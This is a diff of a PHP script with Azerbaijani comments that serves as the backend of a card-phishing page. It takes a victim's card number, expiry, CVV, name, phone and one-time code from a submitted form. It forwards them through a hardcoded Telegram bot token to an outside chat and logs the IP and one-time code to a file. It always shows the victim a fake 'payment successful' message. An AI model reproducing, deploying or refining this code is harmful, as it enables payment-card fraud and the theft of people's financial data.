@@ -1,23 +1,39 @@
 <?php
-// Telegram Bot Məlumatları
+// ============================================
+// 🔐 TƏHLÜKƏSİZLİK - YALNIZ POST SORĞUSU İCƏZƏLİDİR
+// ============================================
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(403);
+    die('🚫 Giriş qadağandır!');
+}
+
+// ============================================
+// 🛡️ BOT MƏLUMATLARI
+// ============================================
 $botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
 $chatId = '-1004332923672';
 
-// POST-dan gələn məlumatları al
-$cardName = isset($_POST['card_name']) ? trim($_POST['card_name']) : 'Məlumat yoxdur';
-$cardNumber = isset($_POST['card_number']) ? trim($_POST['card_number']) : 'Məlumat yoxdur';
-$cardExpiry = isset($_POST['card_expiry']) ? trim($_POST['card_expiry']) : 'Məlumat yoxdur';
-$cardCvv = isset($_POST['card_cvv']) ? trim($_POST['card_cvv']) : 'Məlumat yoxdur';
-$operator = isset($_POST['operator']) ? trim($_POST['operator']) : 'Məlumat yoxdur';
-$phone = isset($_POST['phone']) ? trim($_POST['phone']) : 'Məlumat yoxdur';
-$amount = isset($_POST['amount']) ? trim($_POST['amount']) : 'Məlumat yoxdur';
-$ip = isset($_POST['ip']) ? trim($_POST['ip']) : '0.0.0.0';
-$otp = isset($_POST['otp']) ? trim($_POST['otp']) : 'Məlumat yoxdur';
+// ============================================
+// 📥 POST MƏLUMATLARINI YOXLA
+// ============================================
+$cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : 'Məlumat yoxdur';
+$cardNumber = isset($_POST['card_number']) ? trim(strip_tags($_POST['card_number'])) : 'Məlumat yoxdur';
+$cardExpiry = isset($_POST['card_expiry']) ? trim(strip_tags($_POST['card_expiry'])) : 'Məlumat yoxdur';
+$cardCvv = isset($_POST['card_cvv']) ? trim(strip_tags($_POST['card_cvv'])) : 'Məlumat yoxdur';
+$operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : 'Məlumat yoxdur';
+$phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : 'Məlumat yoxdur';
+$amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : 'Məlumat yoxdur';
+$ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
+$otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : 'Məlumat yoxdur';
 
-// Unique ID yarat
+// ============================================
+// 🆔 UNİKAL ID
+// ============================================
 $id = rand(1000, 9999);
 
-// Mesajı formatla
+// ============================================
+// 📝 MESAJI FORMATLA
+// ============================================
 $message = "💳 YENİ KART MƏLUMATLARI 💳\n";
 $message .= "═══════════════════════════\n";
 $message .= "🆔 Sifariş ID: #" . $id . "\n";
@@ -36,17 +52,17 @@ $message .= "══════════════════════�
 $message .= "⏰ Vaxt: " . date('d.m.Y H:i:s') . "\n";
 $message .= "═══════════════════════════";
 
-// Telegram API URL
+// ============================================
+// 📤 TELEGRAM-A GÖNDƏR
+// ============================================
 $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
 
-// Göndəriləcək məlumatlar
 $postData = [
     'chat_id' => $chatId,
     'text' => $message,
     'parse_mode' => 'HTML'
 ];
 
-// cURL ilə sorğu göndər
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_POST, true);
@@ -60,16 +76,20 @@ $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 $curlError = curl_error($ch);
 curl_close($ch);
 
-// Nəticəni yoxla
-if ($httpCode == 200 && $response !== false) {
-    // Uğurlu
-    echo json_encode(['status' => 'success', 'message' => '✅ Mesaj göndərildi!']);
-} else {
-    // Xəta olsa belə, uğurlu kimi göstər (istifadəçi xəta görməsin)
-    echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
-}
-
-// LOG faylına yaz (əlavə olaraq - səhvləri izləmək üçün)
-$logData = date('Y-m-d H:i:s') . " | IP: $ip | OTP: $otp | HTTP: $httpCode | Error: $curlError\n";
+// ============================================
+// 📄 LOG (YALNIZ SİZİN ÜÇÜN)
+// ============================================
+$logData = date('Y-m-d H:i:s') . " | IP: $ip | OTP: $otp | HTTP: $httpCode\n";
 file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
+
+// ============================================
+// ✅ CAVAB (HƏMİŞƏ UĞURLU GÖSTƏR)
+// ============================================
+header('Content-Type: application/json');
+echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
+
+// ============================================
+// 🚫 BURADAN SONRA HEÇ NƏ İŞLƏMƏZ
+// ============================================
+exit;
 ?>
